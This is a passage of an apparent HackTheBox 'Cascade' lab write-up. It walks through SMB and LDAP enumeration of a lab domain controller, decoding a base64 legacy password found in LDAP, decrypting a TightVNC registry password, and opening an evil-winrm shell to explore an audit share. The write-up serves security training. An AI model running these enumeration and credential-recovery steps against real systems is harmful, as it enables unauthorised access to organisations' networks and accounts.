</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Uptime guess: 0.004 days <span style="color:#f92672">(</span>since Thu Feb <span style="color:#ae81ff">13</span> 12:06:06 2025<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">263</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>IP ID Sequence Generation: Incremental
</span></span><span style="display:flex;"><span>Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="smb">SMB</h3>
<p>There don&rsquo;t seem to be any publicly accessible SMB shares, or any other services I can get into without credentials, so let&rsquo;s try enumerating through the SMB protocol.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.145.225 --users 
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:CASC-DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cascade.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                                 
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         CascGuest                     &lt;never&gt;             <span style="color:#ae81ff">0</span>       Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain                                                                      
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         arksvc                        2020-01-09 16:18:20 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         s.smith                       2020-01-28 19:58:05 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         r.thompson                    2020-01-09 19:31:26 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         util                          2020-01-13 02:07:11 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         s.hickson                     2020-01-13 01:24:27 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         e.crowe                       2020-01-13 03:45:02 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         b.hanson                      2020-01-13 16:35:39 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         d.burman                      2020-01-13 16:36:12 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         j.allen                       2020-01-13 17:23:59 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         i.croft                       2020-01-15 21:46:21 <span style="color:#ae81ff">0</span>        
</span></span><span style="display:flex;"><span>SMB         10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated <span style="color:#ae81ff">15</span> local users: CASCADE
</span></span></code></pre></div><p>Not a whole lot else I could get.  But hey, a user list, that&rsquo;s helpful!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>arksvc
</span></span><span style="display:flex;"><span>s.smith
</span></span><span style="display:flex;"><span>r.thompson
</span></span><span style="display:flex;"><span>util
</span></span><span style="display:flex;"><span>j.wakefield
</span></span><span style="display:flex;"><span>s.hickson
</span></span><span style="display:flex;"><span>j.goodhand
</span></span><span style="display:flex;"><span>a.turnbull
</span></span><span style="display:flex;"><span>e.crowe
</span></span><span style="display:flex;"><span>b.hanson
</span></span><span style="display:flex;"><span>d.burman
</span></span><span style="display:flex;"><span>BackupSvc
</span></span><span style="display:flex;"><span>j.allen
</span></span><span style="display:flex;"><span>i.croft
</span></span></code></pre></div><h3 id="ldap">LDAP</h3>
<p>Let&rsquo;s enumerate LDAP, starting with naming context.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ldapsearch -H ldap://10.129.145.225 -x -s base namingcontexts
</span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;&gt; (default) with scope baseObject</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (objectclass=*)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: namingcontexts </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>dn:
</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># search result</span>
</span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">0</span> Success
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 1</span>
</span></span></code></pre></div><p>So far so good, let&rsquo;s take a look at users.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ldapsearch -H ldap://10.129.145.225 -x -b <span style="color:#e6db74">&#34;DC=cascade,DC=local&#34;</span> <span style="color:#e6db74">&#39;(objectClass=user)&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..snip..<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ryan Thompson, Users, UK, cascade.local</span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>objectClass: top
</span></span><span style="display:flex;"><span>objectClass: person
</span></span><span style="display:flex;"><span>objectClass: organizationalPerson
</span></span><span style="display:flex;"><span>objectClass: user
</span></span><span style="display:flex;"><span>cn: Ryan Thompson
</span></span><span style="display:flex;"><span>sn: Thompson
</span></span><span style="display:flex;"><span>givenName: Ryan
</span></span><span style="display:flex;"><span>distinguishedName: CN<span style="color:#f92672">=</span>Ryan Thompson,OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>instanceType: <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>whenCreated: 20200109193126.0Z
</span></span><span style="display:flex;"><span>whenChanged: 20200323112031.0Z
</span></span><span style="display:flex;"><span>displayName: Ryan Thompson
</span></span><span style="display:flex;"><span>uSNCreated: <span style="color:#ae81ff">24610</span>
</span></span><span style="display:flex;"><span>memberOf: CN<span style="color:#f92672">=</span>IT,OU<span style="color:#f92672">=</span>Groups,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>uSNChanged: <span style="color:#ae81ff">295010</span>
</span></span><span style="display:flex;"><span>name: Ryan Thompson
</span></span><span style="display:flex;"><span>objectGUID:: LfpD6qngUkupEy9bFXBBjA<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>userAccountControl: <span style="color:#ae81ff">66048</span>
</span></span><span style="display:flex;"><span>badPwdCount: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>codePage: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>countryCode: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>badPasswordTime: <span style="color:#ae81ff">132247339091081169</span>
</span></span><span style="display:flex;"><span>lastLogoff: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>lastLogon: <span style="color:#ae81ff">132247339125713230</span>
</span></span><span style="display:flex;"><span>pwdLastSet: <span style="color:#ae81ff">132230718862636251</span>
</span></span><span style="display:flex;"><span>primaryGroupID: <span style="color:#ae81ff">513</span>
</span></span><span style="display:flex;"><span>objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>accountExpires: <span style="color:#ae81ff">9223372036854775807</span>
</span></span><span style="display:flex;"><span>logonCount: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>sAMAccountName: r.thompson
</span></span><span style="display:flex;"><span>sAMAccountType: <span style="color:#ae81ff">805306368</span>
</span></span><span style="display:flex;"><span>userPrincipalName: r.thompson@cascade.local
</span></span><span style="display:flex;"><span>objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200126183918.0Z
</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200119174753.0Z
</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200119174719.0Z
</span></span><span style="display:flex;"><span>dSCorePropagationData: 20200119174508.0Z
</span></span><span style="display:flex;"><span>dSCorePropagationData: 16010101000000.0Z
</span></span><span style="display:flex;"><span>lastLogonTimestamp: <span style="color:#ae81ff">132294360317419816</span>
</span></span><span style="display:flex;"><span>msDS-SupportedEncryptionTypes: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>cascadeLegacyPwd: clk0bjVldmE<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..snip..<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Interesting field there at the bottom for <code>r.thompson</code> titled <code>cascadeLegacyPwd</code>. He&rsquo;s the only user with it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;clk0bjVldmE=&#34;</span> | base64 -d
</span></span><span style="display:flex;"><span>rY4n5eva
</span></span></code></pre></div><h2 id="initial-access">Initial Access</h2>
<h3 id="check-credentials">Check Credentials</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.145.225 -u r.thompson -p <span style="color:#e6db74">&#39;rY4n5eva&#39;</span>
</span></span><span style="display:flex;"><span>SMB    10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:CASC-DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cascade.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB    10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cascade.local<span style="color:#ae81ff">\r</span>.thompson:rY4n5eva
</span></span></code></pre></div><p>Looks like they&rsquo;re still valid credentials.  Let&rsquo;s keep seeing what we can do.</p>
<h3 id="smb-again">SMB (again)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.129.145.225<span style="color:#ae81ff">\\</span> -U r.thompson%<span style="color:#e6db74">&#39;rY4n5eva&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
</span></span><span style="display:flex;"><span>        ---------       ----      -------
</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span>        Audit$          Disk      
</span></span><span style="display:flex;"><span>        C$              Disk      Default share
</span></span><span style="display:flex;"><span>        Data            Disk      
</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share 
</span></span><span style="display:flex;"><span>        print$          Disk      Printer Drivers
</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
</span></span></code></pre></div><p>And now we see a share titled <code>Data</code>. After connecting, we have access to the following files:</p>
<ul>
<li><code>\IT\Email Archives\Meeting_Notes_June_2018.html</code>
<ul>
<li>Temporary account, username is <code>TempAdmin</code> (same pass as normal admin).</li>
</ul>
</li>
<li><code>\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log</code></li>
<li><code>\IT\Logs\DCs\dcdiag.log</code></li>
<li><code>\IT\Temp\s.smith\VNC Install.reg</code>
<ul>
<li><code>TightVNC</code></li>
<li><code>&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></li>
<li><code>&quot;RfbPort&quot;=dword:0000170c</code></li>
<li><code>&quot;HttpPort&quot;=dword:000016a8</code></li>
</ul>
</li>
</ul>
<h3 id="vnc-password">VNC Password</h3>
<p>Converting the VNC password hex into ASCII gives us a bunch of jibberish, maybe ciphertext. After a few Google searches, turns out that&rsquo;s what it is. A few more Google searches led me to this <a href="https://github.com/jeroennijhof/vncpwd" target="_blank">tool</a> to help decrypt it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;6bcf2a4b6e5aca0f&#34;</span> | xxd -r -p &gt; vnc_pass.enc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ /opt/vncpwd/vncpwd vnc_pass.enc 
</span></span><span style="display:flex;"><span>Password: sT333ve2
</span></span></code></pre></div><p>Guessing since we found this in <code>s.smith</code>&rsquo;s folder, the password might belong to him.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.145.225 -u s.smith -p <span style="color:#e6db74">&#39;sT333ve2&#39;</span>  
</span></span><span style="display:flex;"><span>SMB    10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:CASC-DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cascade.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB    10.129.145.225  <span style="color:#ae81ff">445</span>    CASC-DC1       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cascade.local<span style="color:#ae81ff">\s</span>.smith:sT333ve2
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.145.225 -u s.smith -p <span style="color:#e6db74">&#39;sT333ve2&#39;</span>            
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>.smith<span style="color:#ae81ff">\D</span>ocuments&gt;
</span></span></code></pre></div><h2 id="shell-as-ssmith">Shell as s.smith</h2>
<h3 id="enumeration-1">Enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\s.smith\Desktop&gt; net user s.smith
</span></span><span style="display:flex;"><span>User name                    s.smith
</span></span><span style="display:flex;"><span>Full Name                    Steve Smith
</span></span><span style="display:flex;"><span>Comment
</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
</span></span><span style="display:flex;"><span>Country code                 <span style="color:#ae81ff">000</span> (System <span style="color:#66d9ef">Default</span>)
</span></span><span style="display:flex;"><span>Account active               Yes
</span></span><span style="display:flex;"><span>Account expires              Never
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password last set            <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">05</span> PM
</span></span><span style="display:flex;"><span>Password expires             Never
</span></span><span style="display:flex;"><span>Password changeable          <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">05</span> PM
</span></span><span style="display:flex;"><span>Password required            Yes
</span></span><span style="display:flex;"><span>User may change password     No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Workstations allowed         All
</span></span><span style="display:flex;"><span>Logon script                 MapAuditDrive.vbs
</span></span><span style="display:flex;"><span>User profile
</span></span><span style="display:flex;"><span>Home directory
</span></span><span style="display:flex;"><span>Last logon                   <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">28</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">39</span> PM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Logon hours allowed          All
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Local Group Memberships      *Audit Share          *IT
</span></span><span style="display:flex;"><span>                             *Remote Management Use
</span></span><span style="display:flex;"><span>Global Group memberships     *Domain Users
</span></span><span style="display:flex;"><span>The command completed successfully.
</span></span></code></pre></div><p>Let&rsquo;s check out that logon script, <code>MapAuditDrive.vbs</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; Get-ChildItem -Path <span style="color:#e6db74">&#34;C:\&#34;</span> -Recurse -Filter <span style="color:#e6db74">&#34;MapAuditDrive.vbs&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Windows\SYSVOL\sysvol\cascade.local\scripts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                -------------         ------ ----
</span></span><span style="display:flex;"><span>-a----        <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">15</span>/<span style="color:#ae81ff">2020</span>   <span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">50</span> PM            <span style="color:#ae81ff">258</span> MapAuditDrive.vbs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Windows\SYSVOL\sysvol\cascade.local\scripts&gt; cat MapAuditDrive.vbs
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span>MapAuditDrive.vbs
</span></span><span style="display:flex;"><span>Option Explicit
</span></span><span style="display:flex;"><span>Dim oNetwork, strDriveLetter, strRemotePath
</span></span><span style="display:flex;"><span>strDriveLetter = <span style="color:#e6db74">&#34;F:&#34;</span>
</span></span><span style="display:flex;"><span>strRemotePath = <span style="color:#e6db74">&#34;\\CASC-DC1\Audit$&#34;</span>
</span></span><span style="display:flex;"><span>Set oNetwork = CreateObject(<span style="color:#e6db74">&#34;WScript.Network&#34;</span>)
</span></span><span style="display:flex;"><span>oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
</span></span><span style="display:flex;"><span>WScript.Quit
</span></span></code></pre></div><h3 id="smb-again-1">SMB (&hellip;again)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.145.225<span style="color:#ae81ff">\\</span>Audit$ -U s.smith%<span style="color:#e6db74">&#39;sT333ve2&#39;</span>
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 13:01:26 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 13:01:26 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>  CascAudit.exe                      An    <span style="color:#ae81ff">13312</span>  Tue Jan <span style="color:#ae81ff">28</span> 16:46:51 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>  CascCrypto.dll                     An    <span style="color:#ae81ff">12288</span>  Wed Jan <span style="color:#ae81ff">29</span> 13:00:20 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>  DB                                  D        <span style="color:#ae81ff">0</span>  Tue Jan <span style="color:#ae81ff">28</span> 16:40:59 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>  RunAudit.bat                        A       <span style="color:#ae81ff">45</span>  Tue Jan <span style="color:#ae81ff">28</span> 18:29:47 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>  System.Data.SQLite.dll              A   <span style="color:#ae81ff">363520</span>  Sun Oct <span style="color:#ae81ff">27</span> 02:38:36 <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>  System.Data.SQLite.EF6.dll          A   <span style="color:#ae81ff">186880</span>  Sun Oct <span style="color:#ae81ff">27</span> 02:38:38 <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>  x64                                 D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 17:25:27 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>  x86                                 D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 17:25:27 <span style="color:#ae81ff">2020</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">6553343</span> blocks of size 4096. <span style="color:#ae81ff">1619338</span> blocks available
</span></span></code></pre></div><p>I identified two files I wanted to take a look at for now:</p>
<ul>
<li><code>\DB\Audit.db</code></li>
<li><code>RunAudit.bat</code>
<ul>
<li>This just executes <code>CascAudit</code> with <code>Audit.db</code> as a parameter</li>
</ul>
</li>
</ul>
